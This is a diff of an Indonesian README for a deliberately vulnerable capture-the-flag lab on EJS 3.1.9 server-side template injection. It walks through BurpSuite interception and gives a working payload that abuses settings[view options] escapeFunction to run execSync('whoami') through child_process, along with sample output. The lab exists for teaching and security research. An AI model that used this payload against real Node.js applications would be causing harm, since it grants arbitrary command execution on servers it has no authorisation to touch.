@@ -20,7 +20,7 @@ Dengan memanfaatkan kelemahan ini, attacker dapat:
 Pada **EJS versi 3.1.9**, jika diset `client=true` dan `escapeFunction` dilewatkan sebagai function injection, maka **arbitrary JS code** bisa dijalankan saat template dirender.
 
 Contoh payload:
-```
+```bash
 &settings[view options][client]=true
 &settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');
 ```
@@ -43,3 +43,45 @@ Jalankan BurpSuite pada background untuk intercept
 
 1. Aktifkan BurpSuite Intercept
 <img src="./assets/1.png"></img>
+2. Buka browser ke: `http://localhost:3000/settings`
+<img src="./assets/2.png"></img>
+3. Masukkan credentials apapun (nama & password ex: malvin, 123)
+<img src="./assets/3.png"></img>
+4. Submit form dan tangkap request-nya di BurpSuite
+<img src="./assets/4.png"></img>
+5. Masukkan Payload SSTI ke dalam body request seperti ini:
+```bash
+name=ctfer&password=123&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');
+```
+<img src="./assets/5.png"></img>
+6. Forward Request, kembali ke browser dan lihat hasil perintah dieksekusi!
+<img src="./assets/6.png"></img>
+
+<hr>
+
+🔎 Output Contoh
+```html
+Welcome ctfer
+web
+```
+
+🎓 Tujuan Lab Ini
+1. Memahami dampak eksploitasi SSTI
+2. Belajar intercept dan manipulasi request real-time
+3. Eksperimen dengan template injection di Node.js (EJS Engine)
+
+<hr> 
+
+⚠️ Disclaimer
+Lab ini hanya untuk tujuan edukasi dan riset keamanan.
+Jangan gunakan teknik ini untuk menyerang sistem tanpa izin.
+
+<hr>
+
+🤝 Kontribusi
+Pull request & issue welcome via: ctflabs-id/EJS-SSTI-VULN
+
+🧠 Maintained by
+1. GitHub: @ctflabs-id
+2. Website: ctflabsid.my.id
+
